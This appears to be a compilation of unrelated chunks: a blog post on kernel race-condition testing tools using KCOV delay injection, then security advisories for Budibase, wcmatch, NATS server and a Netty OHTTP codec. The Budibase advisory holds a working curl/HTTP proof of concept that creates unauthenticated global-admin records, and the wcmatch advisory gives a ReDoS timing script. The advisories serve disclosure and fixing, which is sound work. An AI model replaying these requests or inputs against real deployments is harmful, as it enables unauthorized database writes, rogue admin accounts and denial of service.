Text:
Many security bugs are race conditions, where multi-threaded execution has to occur with the right interleaving for a negative effect to appear. This creates challenges for several use cases:

- Confirming bug candidates that have been discovered manually or through static analysis.
- Regression tests: After fixing a race condition bug, there is often no good way to write a regression test that reliably triggers the bug as part of a test suite.
- Automatic bug discovery, such as fuzzing: It is hard for a fuzzer to exercise all interesting interleavings of concurrent operations, or reach code paths that are only exercised when operations are racing.

I mostly discover bugs by manually reading code. When I think I’ve found a bug, I normally write a test case to either prove or disprove that the bug exists. For race condition bugs, it can be hard to achieve either outcome. For Linux kernel bugs, I often resort to recompiling the kernel after adding conditional `mdelay()` calls (which spinloop for roughly the specified amount of time) in appropriate places; I usually make these conditional based on the name of the running thread, though sometimes more complex conditions are needed. On platforms that support DTrace (like macOS and [Windows](https://github.com/microsoft/DTrace-on-Windows/commit/dbfb82f7fb70e001f303eab497ec4338295605f8)), it is possible to use DTrace probes that call [`chill()`](https://docs.oracle.com/cd/E19253-01/817-6223/chp-actsub-chill/index.html) for similar effect, though the utility of this is limited as DTrace can only trace on non-inline function boundaries or explicit trace points, rather than on every instruction. Regardless of platform, this approach can be time consuming and can require trial and error to definitely determine whether code is buggy.

Additionally, in the Linux kernel, fixes for race condition bugs are often accompanied by hand-written ASCII diagrams showing problematic thread interleavings with call graphs and relevant memory accesses (for example, see this recent [rt_spin_unlock UAF fix](https://git.kernel.org/linus/89038cc87d80c77e7aa6f42a64b2573b74af339f), or this recent [jbd2 deadlock fix](https://git.kernel.org/linus/981fcc5674e67158d24d23e841523eccba19d0e7)). It would be convenient to have developer tooling that can analyze potentially vulnerable code and show results in a similar representation.
Title: Testing race conditions with memory access tracing and stack-based delay injection

Text:
## Summary

I wrote tools for exploring possible interleavings of multi-threaded test cases for the Linux kernel:

- A tool that automatically tests all possible A-B-A interleavings of a test case.
- A terminal UI for manual exploration of possible interleavings.
- A GUI for manual exploration of possible interleavings.

The kernel part of this is intended to also be usable for discovering race conditions via fuzzing, but userspace tooling for that still needs to be implemented.

The tools are available [on GitHub](https://github.com/googleprojectzero/MAccConc) under the name MAccConc, short for “Memory Access Concurrency”; see the README there for installation and usage instructions.

If you just want to see the tooling in action, skip to [Demo: automatic testing](https://projectzero.google/2026/09/maccconc-race-condition.html#demo-automatic-testing).

If you’re just interested in the theory behind the tooling, read section [Stable identifiers for memory accesses across runs: count-augmented stack traces](https://projectzero.google/2026/09/maccconc-race-condition.html#stable-identifiers-for-memory-accesses-across-runs-count-augmented-stack-traces).
Title: Testing race conditions with memory access tracing and stack-based delay injection

Text:
## Prior work

This project was inspired by discussions with Ned Williamson, whose [sockfuzzer](https://projectzero.google/2021/04/designing-sockfuzzer-network-syscall.html#h.bydr5qowo002) project involved exploration of concurrency bugs by using a custom scheduler that can reschedule at synchronization primitives to explore interleavings. See the conference talk [slides](https://github.com/googleprojectzero/SockFuzzer/blob/main/third_party/concurrence/presentations/catch_me_if_you_can.pdf) and [recording](https://www.youtube.com/watch?v=OpQvXGJcH4s) focused on the concurrency testing aspect of this.

My tooling is largely based on ideas similar to [SKI](https://www.usenix.org/conference/osdi14/technical-sessions/presentation/fonseca), but SKI uses a different implementation: It records memory accesses and controls scheduling of vCPUs using a patched version of QEMU in TCG mode, and uses VM snapshots to explore different execution interleavings.
Title: Testing race conditions with memory access tracing and stack-based delay injection

Text:
## Discovering memory accesses that could contribute to race conditions (communication points)

As described in the SKI paper, interesting execution interleavings of a given multi-threaded test case can be discovered by tracing memory accesses of all threads and searching for pairs of accesses on two threads that could interact with each other - meaning, roughly, that at least one of them is a write operation, and they access overlapping memory ranges. The SKI paper calls such memory accesses communication points.

This requires some mechanism to collect memory access coverage. SKI did this by patching QEMU’s TCG mode; I am instead relying on ASAN instrumentation in “outline” mode (compiler backend flag `asan-instrumentation-with-call-threshold=0`, selected by `CONFIG_KASAN_OUTLINE` in the Linux kernel), which generates helper function calls on memory access. I believe that the kernel is the right place to collect this data because it would allow the kernel to also provide higher-level information about lock acquire/release events and such, though I have not implemented this at this time. Implementing this in the kernel also means that it would theoretically be possible to test on bare-metal hardware, rather than inside VMs.

Since Linux already has [KCOV](https://docs.kernel.org/dev-tools/kcov.html) as a mechanism to feed basic block kernel coverage information to userspace, I decided to use the same mechanism to record information about memory accesses. An alternative would have been to use ftrace, which is oriented towards tracing use cases, and includes a function graph tracing mode built on fentry hooks and more complex output buffer management that is oriented towards use cases including system-wide data collection. I chose to use KCOV because of its simpler in-memory representation of trace data (which could become relevant for recovering trace data from crashed VMs); because it uses static always-on instrumentation rather than runtime-enabled instrumentation with near-zero overhead in disabled state; and because my impression is that KCOV is designed for higher-frequency trace events than ftrace.

### Implementation detail: ASAN and TSAN

ASAN normally merges helper calls for subsequent memory accesses. To receive one callback per memory access, the kernel patches explicitly disable this compiler optimization using the `asan-opt-same-temp` backend flag.
Title: Testing race conditions with memory access tracing and stack-based delay injection

Text:
### Implementation detail: ASAN and TSAN

ASAN is intended for identifying UAF, so it does not emit helper calls on direct stack memory access unless there is potential for out-of-bounds access. This means that some race conditions involving on-stack objects, such as wait queues, may not be detectable with this. ASAN also by default emits no helper calls for access to globals, but this optimization can be disabled using the `asan-opt-globals` backend flag.

An alternative would be to use TSAN instrumentation instead, which is designed for detecting data races and also provides information about access atomicity. The downside of TSAN instrumentation is that compilers do not support emitting both ASAN and TSAN hooks at the same time - so to still have working detection of memory safety violations (like UAF) while using TSAN hooks, it would be necessary to run the kernel’s ASAN implementation off of the TSAN hooks or change the compiler.

### Implementation detail: KCOV and background work

Some race conditions involve background work, for example:

- receive processing of loopback network packets
- RCU callbacks

KCOV can optionally collect [remote coverage](https://docs.kernel.org/dev-tools/kcov.html#remote-coverage-collection) for background work in some subsystems; however, in upstream Linux, most types of background work that would be interesting for me are not yet integrated with this mechanism, and remote coverage is currently mainly used for fuzzing subsystems that handle incoming data from devices, like bluetooth and USB.

Enabling this for other parts of the kernel should be relatively straightforward, and I have a [draft patch](https://github.com/thejh/linux/commit/35c9db608c164c4112d57ecb9db32780ce4aba1d) for doing this for RCU callbacks.
Title: Testing race conditions with memory access tracing and stack-based delay injection
Heading_Path: Discovering memory accesses that could contribute to race conditions (communication points)

Text:
## Stable identifiers for memory accesses across runs: count-augmented stack traces

To test out different orderings of memory accesses, a way to stably identify interesting memory accesses across test case executions is needed. Identifying memory accesses based on the data address would not work if the data address was located in an object which is freshly allocated during each test case execution; and identifying memory accesses solely by instruction address would not work well if the memory access was in a function like `memcpy()` or `spin_lock()`.

SKI solves this using VM state snapshots, so that each execution starts from the same global state.

I am instead identifying memory accesses with count-augmented stack traces, where each stack trace element essentially consists of a callee function address and a number indicating how many calls to this callee should be skipped in the calling stack frame.

An example of the semantics of a count-augmented stack trace would be something like: “On this thread, look at the second call to `__x64_sys_recvfrom`, then within that, the first call to `__sys_recvfrom`, then within that the first call to `sock_recvmsg`, then within that, the first call to `unix_stream_recvmsg`, then within that, the first call to `unix_stream_read_generic`, then within that, the second call to `_raw_spin_unlock`, and then within that, the first memory access at instruction address X”.

This unambiguously identifies a point in an execution trace, is independent of concrete data addresses, and is relatively stable with regards to changes in the control flow of irrelevant parts of the trace.

To make this work, KCOV must provide information about function entry/exit events so that when userspace is parsing KCOV coverage output, it can keep track of how the call stack changes. Doing this nicely requires compiler support as part of SanitizerCoverage; I landed an [LLVM feature patch](https://github.com/llvm/llvm-project/commit/dc5c6d008f487eea8f5d646011f9b3dca6caebd7) for this a few months ago (see [documentation](https://clang.llvm.org/docs/SanitizerCoverage.html#tracing-pcs)), which landed in the LLVM 23.1.0 release.
Title: Testing race conditions with memory access tracing and stack-based delay injection
Heading_Path: Stable identifiers for memory accesses across runs: count-augmented stack traces

Text:
## Forcing execution orderings with delay injection

To force specific execution orderings through KCOV, I implemented an ioctl `KCOV_SET_DI` using which userspace can request that actions (essentially wait/wake) are taken on memory accesses at specific count-augmented stack traces. (See [documentation in my kernel branch](https://github.com/thejh/linux/blob/kcov-tracing/Documentation/dev-tools/kcov.rst).) Each action either sets one flag, or waits for one flag to be set, at a userspace-provided index in a shared array of flags. The possible action types are:

- `DI_STACK_WAKE_PRE`: before the memory access, set flag N
- `DI_STACK_WAIT`: before the memory access, spin-wait until flag N is set
- `DI_STACK_WAKE_POST`: after the memory access, set flag N

With the same ioctl, userspace also configures an upper limit on spin-wait iterations.

Additionally, there are ioctls for userspace to directly interact with the same flags.

This API enables two different ways of using delay injection: constraint-style delay injection and fully-specified ordering.

### Constraint-style delay injection (A-happens-before-B)

Userspace can set up a series of A-happens-before-B constraints, where each such constraint is implemented as a pair of actions in different threads that operate on the same flag:

- `DI_STACK_WAKE_POST` for the access that should happen first
- `DI_STACK_WAIT` for the access that should happen second

With this approach, the execution ordering is left partly non-deterministic. This is what the GUI and terminal UI tools currently implement.

An advantage is that this is somewhat more intuitive for simple cases; however, it requires recording timing information to show the user approximately in what order events happened, and it can make the execution trace more complicated. It also often requires more constraints than a fully specified ordering, and is more complicated to reason about.
Title: Testing race conditions with memory access tracing and stack-based delay injection
Heading_Path: Forcing execution orderings with delay injection

Text:
### Fully specified ordering (context-switch-style)

Userspace can decide on a specific ordering in which events should occur, by picking points at which execution should transfer from one context to another. For the simple case with two execution contexts, this requires that thread A starts running a syscall while thread B begins by spin-waiting on a flag; then when thread A reaches some count-augmented stack trace, thread A uses a combination of `DI_STACK_WAKE_PRE` and `DI_STACK_WAIT` to pause its own execution and let thread B continue; and later, thread B can do the same to switch back.

This is the approach I used for the automatic A-B-A interleaving tester.
Title: Testing race conditions with memory access tracing and stack-based delay injection
Heading_Path: Forcing execution orderings with delay injection

Text:
## Demo: GUI

And here is an example of me using the GUI on the same test case, using it to manually force an ordering where `dup(7)` returns `7`.

At this point, no ordering constraints are enforced yet; `dup()` and `close()` are racing randomly. The GUI shows in what order execution happened:

This current view just shows function call graphs from both threads (thread 1 with black indent, thread 2 with red indent). The close() syscall happened to execute after dup() this time. Normal functions are shown in black; inline functions are shown in green, but only shown if they called a normal function (since “all inline functions” is not ticked).

Ticking “filter to communication points” shows a bunch of memory accesses in blue, which are communication points (as defined above, in short: reads from locations to which other threads write and writes to locations which other threads access; `kfree()` counts as a write operation). Each memory access line shows the type of access (Read/Write/Free), data address, access size, and the memory value before the access. Hovering over an access highlights all overlapping accesses in yellow.

Left-clicking on a memory access shows a view that is instead filtered to only show memory accesses overlapping the selected access. Note that this can show reads that were not identified as communication points (because all writes happen on the same thread).

Left-clicking a function name shows a source code view on the right, interspersed with trace data. Data values loaded by memory reads are shown in red (under the source line and column to which the compiler attributes the access); data writes are marked similarly with a red “WRITE”; memory accesses that are communication points are prefixed with “INTERFERENCE” in orange. Function calls are shown in blue.

By right-clicking on two memory accesses in the call graph view, it is possible to create an ordering constraint between the two accesses, such that the kernel will attempt to make the first selected access happen before the second selected access. Each ordering constraint is shown on the right side, represented as two count-augmented stack traces. Note that the last bottom element of the stack actually identifies a specific instruction, but the UI doesn’t really show this. Also, the count-augmented stack traces shown here do not include inline functions.
Title: Testing race conditions with memory access tracing and stack-based delay injection

Text:
## Demo: GUI

In this case, I have created one ordering constraint that orders the second file descriptor table access in `__fget_files_rcu()` (which is inlined into `__fget_files()`) before the file descriptor table entry removal in `file_close_fd_locked()` (which is inlined into `file_close_fd()`). This ensures that the file descriptor table lookup in `dup()` successfully looks up the file descriptor table entry before it is cleared by the concurrent `close()`.

I have created another ordering constraint that orders the `spin_unlock(&files->file_lock)` in `file_close_fd()` before the `spin_lock(&files->file_lock)` in `alloc_fd()` so that the file descriptor table entry has been released by the time `dup()` searches for an unused entry.

In this view, ordering constraints have been specified, but the test case has not yet been run with this specified ordering.

(This view is filtered to show accesses to the files_struct::file_lock.)

And the new trace appears in the UI, with brown “DELAY INJECTION” lines interspersed to show how the ordering constraints were applied.

Note that the UI shows the ordering of events based on timing information that is associated only with memory accesses; the placement for any event other than a memory access is inferred based on that. In views filtered by data accesses, function entry events are additionally only shown at the time of the first displayed non-function-entry event. For example, in the following screenshot, the first thread may have already entered `get_unused_fd_flags()` by the time `file_close_fd()` called `spin_unlock()`, even though the events are shown the other way around. However, memory accesses should be shown in approximately the right order; with the caveats that the order of memory accesses might be wrong if events happened at the same clock value, and that timing information is recorded by instrumentation that runs directly before the actual access. (Building the tool on fully specified orderings instead would avoid such caveats.)

(This view is filtered to show accesses to the file descriptor table entry.)

More documentation is available inside the GUI.
Title: Testing race conditions with memory access tracing and stack-based delay injection

Text:
## Implementation status

For LLVM: The required patch has landed in LLVM 23.1.0.

For the Linux kernel: The required patches are not yet in the upstream kernel. I am posting [the Linux kernel patch series](https://lore.kernel.org/r/20260908-kcov-extrecord-v3-0-dcbc11593e88@google.com) for upstream review around the same time as this blog post; a git branch with my patches is also available [on github](https://github.com/thejh/linux/commits/kcov-tracing/) (with a few more patches that aren’t yet ready for upstreaming). If you want to test this tooling, you will need to use my kernel branch for now. (See the README in the tools repository for build instructions.)

My kernel patches are in a clean state; the userspace tooling is a bit more hacky, in particular the GUI implementation.

The command-line tooling can only handle two concurrent threads, while the GUI can handle additional execution contexts (with the `kcov-vsock-client` harness: background work launched by thread A).

I am looking forward to hearing if this is useful to others, and maybe even what tools others manage to build on top of this! Feel free to reach out to me (for example via email to maccconc-tooling@google.com).

### Use fully specified orderings instead of constraint-style for manual tooling

The non-automatic tooling currently uses constraint-style delay injection; but as described above, fully-specified orderings have several advantages, including more deterministic behavior. I might change the GUI implementation to use fully-specified orderings instead in the future.

### Type information for human-readable memory access traces

For reading memory access traces as a human, it might be helpful to provide information on the object types that are being accessed. One way to do this would be to follow what [Microsoft’s debugging tools can do with CodeView debuginfo](https://learn.microsoft.com/en-us/visualstudio/profiling/memory-usage?view=vs-2022) and use debuginfo to associate memory allocation function call sites with type information, then let the allocator track the call sites from which objects have been allocated.
Title: Testing race conditions with memory access tracing and stack-based delay injection

Text:
### Type information for human-readable memory access traces

I [proposed to add such a feature to the DWARF standard](https://dwarfstd.org/issues/250407.1.html), which has been accepted and is included in the [current DWARF 6 draft](https://snapshots.sourceware.org/dwarfstd/dwarf-spec/latest/) (search for `DW_AT_alloc_type`), and [added enough support to LLVM](https://github.com/llvm/llvm-project/commit/3f0c180ca07faf536d2ae0d69ec044fcd5a78716) to make it work in the same cases where it already worked with CodeView; but so far that only works for C++ `new` calls, I did not land the changes necessary to make it work for `malloc`.

Making this work in the kernel would require infrastructure that either queries allocator metadata for every memory access record or provides an initial snapshot of heap allocator metadata across the system plus metadata about subsequent memory allocations.

### Higher-level memory access feedback

One inefficiency in my current prototype is that userspace receives no information about the semantics of locking operations. If two threads each perform lots of memory accesses on an object while holding a lock protecting the object, this will generate a large number of potential communication points, but actually a locked section just represents one big communication point. It might be helpful if the kernel provided “lock acquired” and “lock about to be released” events.

But that might not be a very general approach, since impossible orderings caused by locking are not so different from impossible orderings caused by things like an object being initialized before it is published to a global pointer or such.

### Detecting impossible orderings faster: Deadlock detection

In my current implementation, when an attempt is made to force an impossible ordering via delay injection, the result is that one thread spins/waits on a lock until another thread reaches the delay injection timeout, which is inefficient. It might help to have integration with lock debugging infrastructure that can detect such a semi-deadlock in simple cases and abort the test case faster.
Title: Testing race conditions with memory access tracing and stack-based delay injection
Heading_Path: Type information for human-readable memory access traces

Text:
### Fuzzing: Building up test cases with potential communication points like Snowboard

[Snowboard](https://dl.acm.org/doi/10.1145/3477132.3483549) (a project that searches for concurrency bugs caused by interaction between fuzzer-generated single-threaded test cases) used recorded information about memory accesses in single-threaded test cases to identify which test cases could have interesting communication points when executed in parallel. It would be interesting to build something similar on top of this KCOV-based instrumentation.

It might also be interesting to use this for single-threaded test case creation: Start by collecting memory access coverage for individual system calls, then use that to determine which syscalls might interact with each other in interesting ways when executed in sequence, and build up longer system call sequences this way.

This would be easier using VM snapshots (like SKI), since my approach does not lead to stable data addresses across test case executions; but it would probably be possible by identifying memory locations that are different between test cases abstractly based on allocation sites, as long as allocation site information is available for all objects that are allocated per test case execution.

### KCOV output to host-shared memory

My current tooling loses KCOV output if the kernel under test panics, so it can’t be used for displaying what happened when a kernel crash occurred.

For use cases where the kernel under test is a KVM guest, it might be useful to give the host direct access to the KCOV output buffer. One way to do this might be to use pages in a file on [virtiofs with DAX](https://lore.kernel.org/all/20200304165845.3081-1-vgoyal@redhat.com/) as the KCOV output buffer, and allow writing KCOV output into userspace-provided pages.
Title: Testing race conditions with memory access tracing and stack-based delay injection
Heading_Path: Fuzzing: Building up test cases with potential communication points like Snowboard

Text:
### Summary

On a self-hosted, single-tenant Budibase instance (`multiTenancy:false`), the public bootstrap endpoint `POST /api/global/users/init` remains fully exploitable **after** the instance has been provisioned. Its "already initialised" guard (`checkAnyUserExists()`) is evaluated inside a **tenant-scoped** database context derived from an **attacker-controlled `tenantId`** in the request body. Because the tenancy layer never constrains that `tenantId` to the only legitimate tenant (`default`) on a single-tenant deployment, an unauthenticated attacker simply supplies any unused tenant name to make the guard see an empty user list, and the endpoint then creates a brand-new CouchDB database (`<tenantId>_global-db`) and a **global-admin** user document (`admin.global = true`, `builder.global = true`) inside it - with no authentication and no CSRF token.

This is (a) a bypass of the security control meant to permanently close first-run setup, and (b) an unauthenticated, persistent write primitive that lets an anonymous attacker create an unbounded number of databases and admin-user documents - a resource-exhaustion / denial-of-service vector against the CouchDB datastore, plus creation of latent rogue admin accounts.

### Details

Root cause chain (source, tag v3.44.0):
Title: [NPM] Budibase: Unauthenticated global-admin & database creation via tenant-confusion bypass of the one-time init guard (`POST /api/global/users/init`)

Text:
### Details

1. `packages/worker/src/api/index.ts:41` - `POST /api/global/users/init` is in `PUBLIC_ENDPOINTS`, so `auth.buildAuthMiddleware(PUBLIC_ENDPOINTS)` marks it `publicEndpoint` and the "no public access to worker" gate (`api/index.ts:159-165`) lets it through **without any session**. It is also in `NO_TENANCY_ENDPOINTS` (`api/index.ts:83`), so the tenancy middleware does **not** pin the request to `default` - the tenant is taken verbatim from the request body - and in `NO_CSRF_ENDPOINTS`.
2. `packages/worker/src/middleware/cloudRestricted.ts:10,25` - the `cloudRestricted` guard only enforces the internal API key when `!env.SELF_HOSTED && !env.DISABLE_ACCOUNT_PORTAL`. On a self-hosted instance (`SELF_HOSTED=true`) it is a **no-op** (`return next()`), so `cloudRestrictedRoutes` provides no protection here.
3. `packages/worker/src/api/routes/global/users.ts:69-79` - `cloudRestrictedRoutes.post("/api/global/users/init", … controller.adminUser)`.
4. `packages/worker/src/api/controllers/global/users.ts:232` - the handler runs `await tenancy.doInTenant(tenantId, …)` using the **attacker-supplied** `tenantId`.
5. `packages/worker/src/api/controllers/global/users.ts:238` - the only guard, `const userExists = await checkAnyUserExists()`, throws 403 only if a user exists **in the current tenant context**.
6. `packages/worker/src/utilities/users.ts:3-15` - `checkAnyUserExists()` calls `tenancy.getGlobalDB()`, which resolves to `<tenantId>_global-db`. For any unused `tenantId` this DB is empty → the guard passes → `userSdk.db.createAdminUser(email, tenantId, …)` (`users.ts:247`) creates a full global admin.

The defect is **incorrect authorization scoping**: the single-tenant deployment invariant ("only tenant `default` exists; init is one-time") is never enforced against the request-supplied `tenantId`, so the guard is evaluated against a namespace the attacker chooses.

Configuration confirmed via `GET /api/system/environment` → `{"multiTenancy":false,"cloud":false,"disableAccountPortal":false,"isDev":false}`.

### Impact

**Type:** Missing/incorrect authorization on a critical function - **unauthenticated bypass of the one-time initialization guard**, yielding anonymous global-admin-document and database creation.
Title: [NPM] Budibase: Unauthenticated global-admin & database creation via tenant-confusion bypass of the one-time init guard (`POST /api/global/users/init`)

Text:
### PoC

Target `http://127.0.0.1:3014` (Budibase `v3.44.0-cloud.2`). **No credentials, no cookies, no CSRF token.** All values real, captured live on 2026-09-02; nothing redacted.

---

#### Step 1 - BASELINE: the guard correctly blocks re-init of the real tenant (`default`)

```bash
curl -s -i -X POST 'http://127.0.0.1:3014/api/global/users/init' \
  -H 'Content-Type: application/json' \
  -d '{"email":"pwn-default@evil.test","password":"Pwned!2026#bb","tenantId":"default"}'
```

**Burp - Request**

```http
POST /api/global/users/init HTTP/1.1
Host: 127.0.0.1:3014
Content-Type: application/json
Content-Length: 82

{"email":"pwn-default@evil.test","password":"Pwned!2026#bb","tenantId":"default"}
```

**Burp - Response**

```http
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8

{"message":"You cannot initialise once an global user has been created.","status":403}
```

---

#### Step 2 - PAYLOAD: supply any unused `tenantId` → the guard is bypassed and a global admin is created, fully unauthenticated

```bash
curl -s -i -X POST 'http://127.0.0.1:3014/api/global/users/init' \
  -H 'Content-Type: application/json' \
  -d '{"email":"pwn-f7poc@evil.test","password":"Pwned!2026#bb","tenantId":"f7poc"}'
```

**Burp - Request**

```http
POST /api/global/users/init HTTP/1.1
Host: 127.0.0.1:3014
Content-Type: application/json
Content-Length: 78

{"email":"pwn-f7poc@evil.test","password":"Pwned!2026#bb","tenantId":"f7poc"}
```

**Burp - Response**

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{"_id":"us_d0c2b6c9014a43e2899a2770d2e6280c","_rev":"1-554ff75f0064fb15f92e341faad7263b","email":"pwn-f7poc@evil.test"}
```

The single differential - `tenantId:"default"` → 403, `tenantId:"f7poc"` → 200 with a persisted `us_…` id - is the whole bug: the one-time-setup guard is scoped to a namespace the attacker chooses.

---

#### Step 3 - the write persisted: re-init of the same tenant now hits the (per-tenant) guard

```bash
curl -s -i -X POST 'http://127.0.0.1:3014/api/global/users/init' \
  -H 'Content-Type: application/json' \
  -d '{"email":"pwn-f7pocb@evil.test","password":"Pwned!2026#bb","tenantId":"f7poc"}'
```

**Burp - Response**

```http
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8

{"message":"You cannot initialise once an global user has been created.","status":403}
```

Each unique `tenantId` is a fresh write primitive - an attacker loops `tenantId=a0001,a0002,…` to create unbounded databases + admin docs (DoS).

---

#### Step 4 & 5 - datastore side-effect: a new `<tenant>_global-db` and a real global-admin document

Read directly from CouchDB inside the container (`$COUCH_DB_URL` = `http://admin:…@127.0.0.1:5984`):

```
GET /_all_dbs =>
[
 "app_cc322a9cd27a492eb934f43b146c6e81",
 "app_dev_cc322a9cd27a492eb934f43b146c6e81",
 "f7poc_global-db",     <-- created by the unauthenticated init call (tenantId=f7poc)
 "global-db"            <-- legitimate default-tenant global DB
]

rogue DB 'f7poc_global-db' present: True
```

The document created in `f7poc_global-db` is a full global admin:

```json
{
  "_id": "us_d0c2b6c9014a43e2899a2770d2e6280c",
  "email": "pwn-f7poc@evil.test",
  "admin":   { "global": true },
  "builder": { "global": true },
  "tenantId": "default",
  "roles": {}
}
```

---

#### Step 6 - ceiling check (honest): the injected admin cannot log in while multi-tenancy is off

```bash
curl -s -i -X POST 'http://127.0.0.1:3014/api/global/auth/f7poc/login' \
  -H 'Content-Type: application/json' \
  -d '{"username":"pwn-f7poc@evil.test","password":"Pwned!2026#bb"}'
```

**Burp - Response**

```http
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8

{"message":"Invalid credentials","status":403}
```

With `multiTenancy:false` the login flow forces the `default` tenant, so the injected admin is **not** usable to log into the running default-tenant instance. The provable impact is therefore control-bypass + unauthenticated persistent datastore writes / DoS + creation of rogue admin accounts that become active if multi-tenancy is later enabled or during tenant-iterating operations (restore/migration).
Title: [NPM] Budibase: Unauthenticated global-admin & database creation via tenant-confusion bypass of the one-time init guard (`POST /api/global/users/init`)

Text:
# Summary

With default flags, a pattern that contains several `*` wildcards takes polynomial time, O(n^k) for k stars, to reject a crafted file name. The pattern is an ordinary developer constant such as `*_*_*_*_*.csv`; only the string being matched comes from the attacker. A 255-byte file name (the maximum on common filesystems) takes 73 s with `fnmatch.fnmatch()` and 86 s with `glob.globmatch()`. The standard library's `fnmatch` handles the same input in under a millisecond.

This is different from GHSA-84v8-qmgq-9g88: that advisory covers extglob patterns, while this case needs no flags and no attacker-controlled pattern.
Title: [PIP] wcmatch: Polynomial-time ReDoS when matching untrusted names against multi-star patterns (default flags)

Text:
# Details

When the subject consists of many `_` and does not end in `.csv`, the regex engine tries every way of splitting it between the stars. CPython fixed the same problem in its own `fnmatch` (bpo-40480) by making every star segment except the last one atomic.

# Impact

Applications that match untrusted names against multi-star patterns can be blocked on a single CPU core for minutes per name. Examples: upload handlers, archive or object-store key filters, and `glob`/`WcMatch` scans of directories where other users can create files. No authentication is needed.
Title: [PIP] wcmatch: Polynomial-time ReDoS when matching untrusted names against multi-star patterns (default flags)

Text:
# Fix

This rejects the 255-byte name in under 1 ms. On my spot-check inputs it gives the same results as the current regex. The same change applies to `_PATH_STAR`.
Title: [PIP] wcmatch: Polynomial-time ReDoS when matching untrusted names against multi-star patterns (default flags)

Text:
# Details

Every `*` is translated to a lazy `.*?` (`_STAR`, `wcmatch/_wcparse.py:212`; `_PATH_STAR` `[^/]*?`, `:218`), which is emitted in `_handle_star` (`:1405-1424`):

```text
*_*_*_*_*.csv  ->  ^(?s:(?=.)(?![.]).*?_.*?_.*?_.*?_.*?\.csv)$
```

# PoC

```python
import time, fnmatch as std
from wcmatch import fnmatch, glob

for pat, n in [('*_*_*_*.csv', 255), ('*_*_*_*.csv', 400), ('*_*_*_*_*.csv', 150),
               ('*_*_*_*_*.csv', 200), ('*_*_*_*_*.csv', 255)]:
    name = '_' * n
    t = time.perf_counter(); fnmatch.fnmatch(name, pat); w = time.perf_counter() - t
    t = time.perf_counter(); std.fnmatchcase(name, pat); s = time.perf_counter() - t
    print(f'{pat:15} len={n}  wcmatch={w:.3f}s  stdlib={s:.5f}s')

t = time.perf_counter(); glob.globmatch('uploads/' + '_' * 255, 'uploads/*_*_*_*_*.csv')
print(f'globmatch {time.perf_counter() - t:.2f}s')
```

wcmatch 11.1, CPython 3.13, macOS:

```text
*_*_*_*.csv     len=255  wcmatch=1.412s   stdlib=0.00001s
*_*_*_*.csv     len=400  wcmatch=8.599s   stdlib=0.00004s
```

Title: [PIP] wcmatch: Polynomial-time ReDoS when matching untrusted names against multi-star patterns (default flags)

Text:
# Fix

Emit every star segment except the last one as an atomic group, as the standard library does. On Python 3.11 and later use `(?>.*?_)`; on 3.10 use the lookahead/backreference form from `fnmatch._join_translated_parts`. For example:

```text
^(?s:(?=.)(?![.])(?>.*?_)(?>.*?_)(?>.*?_)(?>.*?_).*?\.csv)$
```
Title: [PIP] wcmatch: Polynomial-time ReDoS when matching untrusted names against multi-star patterns (default flags)

Text:
### Background

NATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT and edge computing.

The NATS Server supports leafnode connections between servers and message tracing through NATS headers.

### Problem Description

Message trace destination checks were applied to ordinary client connections but not consistently to messages arriving through leafnode connections.

A leafnode operator could cause trace events to be sent to subjects that would not otherwise be permitted and could use trace-only behavior to prevent normal delivery or storage of affected messages.

Trace events can include routing, subscription, account, service import and JetStream metadata. The payload of the original application message is not chosen through the trace event itself.

### Affected Versions

Versions v2.14.2, v2.12.7 and below are vulnerable. The issue is fixed in v2.14.3 and v2.12.8.

### Workarounds

Where possible, avoid granting publish paths from less-trusted leaf nodes into subjects for which trace-only behavior would affect delivery guarantees. No other known workarounds are available aside from upgrading to a fixed release.

### References

 * GHSA advisory: <https://github.com/nats-io/nats-server/security/advisories/GHSA-p3j5-5hrq-p75h>
 * Credit: Koda Reef
Title: [GO] nats-server Leaf node connections bypass Nats-Trace-Dest permission check

Text:
## Summary:

OHttpClientCodec and OHttpServerCodec retain the encrypted outer HttpContent in a handler-level cumulationBuffer. After a valid OHTTP exchange completes, the OHTTP request/response context is destroyed, but the outer cumulationBuffer is not released or reset. It remains referenced by the codec until a later inbound content frame replaces it or the handler is removed/channel is closed.

This can pin attacker-influenced pooled/direct buffer capacity on idle keep-alive channels. Across many long-lived idle connections, this can create availability pressure.

Affected components:

* codec-ohttp/src/main/java/io/netty/incubator/codec/ohttp/OHttpClientCodec.java
* codec-ohttp/src/main/java/io/netty/incubator/codec/ohttp/OHttpServerCodec.java
* codec-ohttp/src/main/java/io/netty/incubator/codec/ohttp/OHttpRequestResponseContext.java
Title: [MAVEN] netty-incubator-codec-ohttp: OHTTP codecs retain consumed outer cumulation buffers after completed exchanges

Text:
## Root cause:

OHttpClientCodec retains inbound content into a handler-level cumulationBuffer. On LastHttpContent, it destroys only the OHttpRequestResponseContextHolder. The cumulationBuffer is released in handlerRemoved(), not immediately after successful exchange completion.

OHttpServerCodec follows the same pattern: it retains inbound content into a handler-level cumulationBuffer, and on completed request/response it destroys the OHttpRequestResponseContext. The outer cumulationBuffer remains owned by the codec and is released only when the handler is removed.

OHttpRequestResponseContext.parse() consumes bytes from the caller-provided outer cumulation buffer, but its destroy() path releases only the inner binary HTTP cumulation, not the codec-level outer cumulationBuffer.
Title: [MAVEN] netty-incubator-codec-ohttp: OHTTP codecs retain consumed outer cumulation buffers after completed exchanges

Text:
## Impact:

A peer can complete a large valid OHTTP request/response and keep the connection open. The codec retains the high-water outer cumulation buffer for the lifetime of the idle keep-alive channel, or until a later inbound content frame replaces it. Across many idle keep-alive channels, this can pin pooled/direct memory and create availability pressure.

This is not unbounded growth per exchange on a single channel. The more precise impact is connection-lifetime retention of the current consumed high-water outer cumulation buffer.
Title: [MAVEN] netty-incubator-codec-ohttp: OHTTP codecs retain consumed outer cumulation buffers after completed exchanges

Text:
## Suggested fix:

After successful LastHttpContent processing, release and reset the codec-level outer cumulationBuffer once parsing has consumed the complete message and no unread bytes remain.

Care is needed not to release the buffer if unread bytes remain for pipelined data. A safe fix would release/reset the outer cumulationBuffer in the completed-exchange path only when the parse consumed the full outer body.
Title: [MAVEN] netty-incubator-codec-ohttp: OHTTP codecs retain consumed outer cumulation buffers after completed exchanges

## Test environment:

* PoC test used BouncyCastleOHttpCryptoProvider and existing OHttpCodecsTest helpers

